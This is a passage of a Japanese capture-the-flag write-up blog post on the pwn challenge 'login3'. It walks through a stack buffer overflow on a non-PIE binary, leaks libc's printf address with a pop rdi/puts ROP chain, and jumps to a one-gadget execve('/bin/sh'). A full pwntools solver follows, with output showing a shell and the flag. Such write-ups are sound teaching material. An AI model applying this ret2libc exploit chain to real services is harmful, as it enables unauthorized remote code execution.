+   0x0000000000401245 &lt;+100&gt;:   jne    0x401255 &lt;main+116&gt;
+   0x0000000000401247 &lt;+102&gt;:   lea    rdi,[rip+0xdc1]        # 0x40200f
+   0x000000000040124e &lt;+109&gt;:   call   0x401030 &lt;puts@plt&gt;
+   0x0000000000401253 &lt;+114&gt;:   jmp    0x401261 &lt;main+128&gt;
+   0x0000000000401255 &lt;+116&gt;:   lea    rdi,[rip+0xdc3]        # 0x40201f
+   0x000000000040125c &lt;+123&gt;:   call   0x401030 &lt;puts@plt&gt;
+   0x0000000000401261 &lt;+128&gt;:   mov    eax,0x0
+   0x0000000000401266 &lt;+133&gt;:   leave  
+   0x0000000000401267 &lt;+134&gt;:   ret 
+</code></pre><p>libcバイナリが与えられており、One-gadget RCE（実行を移すのみで/bin/shが起動するガジェット）に実行を移すことでシェルを取得するのだと予想される。しかし、ASLRがあるため共有ライブラリやスタックの位置は実行する度にランダムに変更される。なお、実行ファイルのPIEは無効になっているため、実行ファイルの位置はランダム化されない。</p><pre tabindex=0><code># checksec login3
+[*] &#39;/ctf/login3/login3&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>ASLRを回避するためには、printf関数などのlibc中のシンボルのアドレスを得ることで、One-gadget RCEのアドレスを算出することが必要らしい。以下のprintf関数の呼び出し部分に着目する。</p><pre tabindex=0><code>gdb-peda$ disassemble printf    
+Dump of assembler code for function printf@plt:
+   0x0000000000401040 &lt;+0&gt;:     jmp    QWORD PTR [rip+0x2fda]        # 0x404020 &lt;printf@got.plt&gt;
+   0x0000000000401046 &lt;+6&gt;:     push   0x1
+   0x000000000040104b &lt;+11&gt;:    jmp    0x401020
+
+gdb-peda$ disassemble main
+...
+   0x000000000040121f &lt;+62&gt;:    call   0x401040 &lt;printf@plt&gt;
+   0x0000000000401224 &lt;+67&gt;:    lea    rax,[rbp-0x20]
+</code></pre><p><code>0x40121f</code>の最初のprintf関数の呼び出し前後のrip+0x2fda（<code>0x404020</code>）の中身を出力すると、<code>0x401040</code>の呼び出し直前にlibc中のprintf関数のアドレスが格納され、<code>0x401040</code>の呼び出しと同時にlibc中のprintf関数にjmpすることがわかる。</p><pre tabindex=0><code># gdb -q login3
+Reading symbols from login3...
+(No debugging symbols found in login3)
+gdb-peda$ b *0x40121f
+Breakpoint 1 at 0x40121f
+gdb-peda$ r
+gdb-peda$ x/1xg 0x404020
+0x404020 &lt;printf@got.plt&gt;:      0x0000000000401046
+gdb-peda$ ni
+gdb-peda$ x/1xg 0x404020
+0x404020 &lt;printf@got.plt&gt;:      0x00007ffff7e31c90
+</code></pre><p>このprintf関数のアドレスを出力するために<code>puts(printf)</code>を実行することを目指す。これはlogin3のPLTの<code>puts</code>関数（<code>0x401030</code>）を実行することで可能。X64では<code>rdi</code>レジスタが<code>puts</code>関数の第一引数となるため、スタックから<code>rdi</code>に値を取り出す<code>pop rdi</code>を探す。検索にはgdb-pedaの<code>dumprop</code>が使用可能。</p><pre tabindex=0><code># gdb -q login3
+Reading symbols from login3...
+(No debugging symbols found in login3)
+gdb-peda$ start
+Warning: this can be very slow, do not run for large memory range
+Writing ROP gadgets to file: login3-rop.txt ...
+0x40115e: ret
+0x40125d: iret
+0x4010c3: cli; ret
+...
+0x40115d: pop rbp; ret
+0x4012d3: pop rdi; ret
+</code></pre><p><code>0x4012d3</code>に<code>pop rdi</code>が存在する。<code>dumprop</code>コマンドは直後に<code>ret</code>がある命令だけを探すため、<code>pop rdi</code>の直後に<code>rdi</code>に格納するためのアドレス<code>0x404020</code>を配置し、その後に<code>puts</code>関数のアドレスを配置しておけば<code>ret</code>によって<code>puts</code>関数が呼び出される。</p><p><code>puts</code>関数によってlibc中のprintf関数のアドレスが得られると、再度main関数を呼び出し、スタックオーバーフローを行うことでOne-gadget RCEを実行する。</p><h2 id=エクスプロイト-2>エクスプロイト</h2><p>実行時のスタックの状態は以下。</p><table><thead><tr><th>アドレス</th><th>サイズ</th><th>内容</th></tr></thead><tbody><tr><td>rbp-0x20</td><td>0x20</td><td>id</td></tr><tr><td>rbp</td><td>0x08</td><td>rbp</td></tr><tr><td>rbp+0x8</td><td>0x08</td><td>リターンアドレス</td></tr></tbody></table><p>1回目の実行後のスタックの状態は以下。</p><table><thead><tr><th>アドレス</th><th>サイズ</th><th>値</th><th>内容</th></tr></thead><tbody><tr><td>rbp-0x20</td><td>0x20</td><td>aaa&mldr;</td><td>id</td></tr><tr><td>rbp</td><td>0x08</td><td>aaa&mldr;</td><td>適当</td></tr><tr><td>rbp+0x8</td><td>0x08</td><td>0x4012d3</td><td>pop rdi; ret</td></tr><tr><td>rbp+0x10</td><td>0x08</td><td>0x404020</td><td>libc中のprintfのアドレスが格納されるアドレス</td></tr><tr><td>rbp+0x18</td><td>0x08</td><td>0x401030</td><td>PLTのputs関数のアドレス</td></tr><tr><td>rbp+0x20</td><td>0x08</td><td>0x4011e1</td><td>main関数のアドレス</td></tr></tbody></table><p>2回目の実行後のスタックの状態は以下のようになる。</p><table><thead><tr><th>アドレス</th><th>サイズ</th><th>値</th><th>内容</th></tr></thead><tbody><tr><td>rbp-0x20</td><td>0x20</td><td>aaa&mldr;</td><td>id</td></tr><tr><td>rbp</td><td>0x08</td><td>aaa&mldr;</td><td>適当</td></tr><tr><td>rbp+0x8</td><td>0x08</td><td>&mldr;</td><td>正確なOne-Gadget RCEのアドレス</td></tr></tbody></table><p>配布された<code>libc-2.31.so</code>を用いて、<code>printf</code>関数とOne-gadget RCEのアドレスを調べる。</p><pre tabindex=0><code># objdump -T libc-2.31.so | grep &#39;printf&#39;
+...
+0000000000064e10 g    DF .text  00000000000000cc  GLIBC_2.2.5 printf
+...
+
+# one_gadget libc-2.31.so 
+0xe6aee execve(&#34;/bin/sh&#34;, r15, r12)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
+
+0xe6af1 execve(&#34;/bin/sh&#34;, r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xe6af4 execve(&#34;/bin/sh&#34;, rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+</code></pre><p>最終的なsolverは以下のようになる。One-gadget RCEのアドレスは<code>0xe6af1</code>が有効であった。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># 各アドレスと値を設定</span>
+</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4012d3</span>
+</span></span><span style=display:flex><span>printf_libc_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x404020</span>
+</span></span><span style=display:flex><span>puts_plt_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401030</span>
+</span></span><span style=display:flex><span>main_func_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x4011e1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># libc内のprintfとone_gadget RCEのアドレス</span>
+</span></span><span style=display:flex><span>libc_printf_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x64e10</span>
+</span></span><span style=display:flex><span>one_gadget_addr_offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xe6af1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># ペイロードを作成 (libcのprintfアドレスをリークするため)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>0x20</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(pop_rdi_ret)     <span style=color:#75715e># rbp+0x08</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(printf_libc_addr) <span style=color:#75715e># rbp+0x10</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(puts_plt_addr)    <span style=color:#75715e># rbp+0x18</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(main_func_addr)   <span style=color:#75715e># rbp+0x20</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># pwntoolsを使用して接続</span>
+</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;localhost&#39;</span>, <span style=color:#ae81ff>10003</span>)
+</span></span><span style=display:flex><span>print(io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;ID: &#39;</span>, payload))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># printfのリークされたアドレスを受け取る</span>
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>, drop<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>leaked_printf_addr <span style=color:#f92672>=</span> u64(data<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># libcのベースアドレスを計算</span>
+</span></span><span style=display:flex><span>libc_base_addr <span style=color:#f92672>=</span> leaked_printf_addr <span style=color:#f92672>-</span> libc_printf_addr
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># one_gadgetの実際のアドレスを計算</span>
+</span></span><span style=display:flex><span>one_gadget_addr <span style=color:#f92672>=</span> libc_base_addr <span style=color:#f92672>+</span> one_gadget_addr_offset
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Leaked printf address: </span><span style=color:#e6db74>{</span>hex(leaked_printf_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Libc base address: </span><span style=color:#e6db74>{</span>hex(libc_base_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;One gadget RCE address: </span><span style=color:#e6db74>{</span>hex(one_gadget_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># 新しいペイロードを作成して実行をone_gadgetに移す</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> (<span style=color:#ae81ff>0x20</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(one_gadget_addr)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;ID: &#39;</span>, payload))
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><pre tabindex=0><code># python3 solver.py
+[+] Opening connection to localhost on port 10003: Done
+b&#39;ID: &#39;
+Leaked printf address: 0x7f6f2f9e7e10
+Libc base address: 0x7f6f2f983000
+One gadget RCE address: 0x7f6f2fa69af1
+b&#39;ID: &#39;
+[*] Switching to interactive mode
+Invalid ID
+$ id
+uid=1003(login3) gid=1003(login3) groups=1003(login3)
+$ ls
+flag.txt
+login3
+login3.sh
+$ cat flag.txt
+FLAG{vOvF4gQyzrRq50eH}
+</code></pre></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
